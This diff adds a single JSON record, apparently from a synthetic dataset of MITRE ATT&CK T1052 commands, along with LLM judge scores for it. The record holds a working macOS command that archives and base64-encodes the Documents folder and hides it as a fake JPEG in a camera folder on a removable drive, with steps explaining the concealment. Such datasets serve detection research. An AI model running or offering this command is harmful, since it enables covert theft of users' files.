@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Documents\" | base64 | dd of=\"/Volumes/CANON_DC/DCIM/100CANON/IMG_4021.JPG\" bs=1m conv=sync && sync",
+  "explanation": "Encodes an archive of Documents as base64 and writes it to a JPEG-named file in a camera-style DCIM folder on the external drive using dd.",
+  "rationale_steps": [
+    "Archive Documents to reduce size and consolidate.",
+    "Base64-encode to appear as text while hiding binary signature.",
+    "Write to a camera-like directory path to blend in on removable media.",
+    "Sync to commit data for offline transport."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-4dcaa55f",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with balanced quoting and valid tar/base64/dd options for macOS, proper separators, and no parsing errors.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives and base64-encodes Documents and writes to a JPEG-named file in a DCIM path on an external volume consistent with T1052, though conv=sync with bs=1m may introduce trailing NUL padding that complicates later decoding.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:48:57.733117Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper piping, balanced quotes, valid flags for all tools (tar, base64, dd), and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing home documents, encoding them as base64, and hiding them as a JPEG file on what appears to be a camera storage device, making it an excellent example of exfiltration over physical medium with obfuscation.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:49:00.793814Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct command usage, valid flags, proper quoting for paths, and correct pipe and logical AND operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command achieves the claimed intent by compressing and encoding data, then writing it to a camouflaged file on a simulated external physical medium, perfectly aligning with T1052's description of packaging, obfuscation, labeling, and use of removable storage.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:49:11.705208Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
